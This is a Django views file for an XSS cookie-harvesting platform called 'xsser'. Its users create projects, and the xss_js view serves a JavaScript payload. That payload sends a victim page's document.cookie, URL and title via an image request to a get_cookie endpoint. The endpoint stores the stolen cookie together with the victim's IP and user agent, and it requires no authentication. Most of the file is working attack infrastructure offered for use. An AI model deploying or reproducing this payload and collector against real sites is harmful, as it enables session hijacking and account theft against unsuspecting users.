#coding=utf-8
import json
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required
from django.http import HttpResponse, Http404, HttpResponseRedirect, HttpResponseForbidden
from django.shortcuts import render, redirect
from xsser.settings import BASE_URL
from .models import XssProject, Record


@login_required(login_url="/login/")
def create_project(request):
    if request.method == "GET":
        return render(request, "core/create_project.html")
    else:
        title = request.POST.get("title")
        if not title:
            return render(request, "info.html", {"info": "请填写标题"})
        if len(title) > 25:
            title = title[:25]
        p = XssProject.objects.create(user=request.user, title=title)
        return HttpResponseRedirect("/project?id=%s" % p.id)


@login_required(login_url="/login/")
def project_detail(request):
    project_id = request.GET.get("id", "-1")
    try:
        p = XssProject.objects.get(pk=int(project_id), user=request.user)
    except XssProject.DoesNotExist:
        raise Http404
    if "csrftoken" in request.COOKIES:
        token = request.COOKIES["csrftoken"]
    else:
        token = ""
    return render(request, "core/project_detail.html", {"project": p, "base_url": BASE_URL, "token": token})


def get_cookie(request):
    project_id = request.GET.get("id", "-1")
    title = request.GET.get("title")
    url = request.GET.get("url")
    cookie = request.GET.get("cookie")
    if "HTTP_X_FORWARDED_FOR" in request.META:
        ip = request.META['HTTP_X_FORWARDED_FOR']
    else:
        ip = request.META['REMOTE_ADDR']
    user_agent=request.META.get("HTTP_USER_AGENT")
    try:
        p = XssProject.objects.get(pk=int(project_id))
    except XssProject.DoesNotExist:
        raise Http404
    r = Record.objects.create(cookie=cookie, user_agent=user_agent, ip=ip, url=url, title=title)

    p.records.add(r)
    p.save()
    return HttpResponse("success")


def xss_js(request):
    project_id = request.GET.get("id", "-1")
    try:
        p = XssProject.objects.get(pk=int(project_id))
    except XssProject.DoesNotExist:
        raise Http404
    js = """
    var x=new Image();
    x.src=''+'%s'+'?a=info&id='+%s+'&title='+document.title+'&url='+escape(document.URL)+'&cookie='+escape(document.cookie);
    """ % (BASE_URL + "get_cookie/", p.id)
    return HttpResponse(js)


@login_required(login_url="/login/")
def my_projects(request):
    p = XssProject.objects.filter(user=request.user)
    return render(request, "core/my_project.html", {"projects": p})


@login_required(login_url="/login")
def delete_project(request):
    project_id = request.GET.get("id", "-1")
    token = request.GET.get("token", " ")

    if "csrftoken" in request.COOKIES:
        if token == request.COOKIES["csrftoken"]:
            try:
                p = XssProject.objects.get(user=request.user, pk=int(project_id))
                p.delete()
                return HttpResponse("success")
            except XssProject.DoesNotExist:
                raise Http404
    return HttpResponseForbidden("Invalid Token")


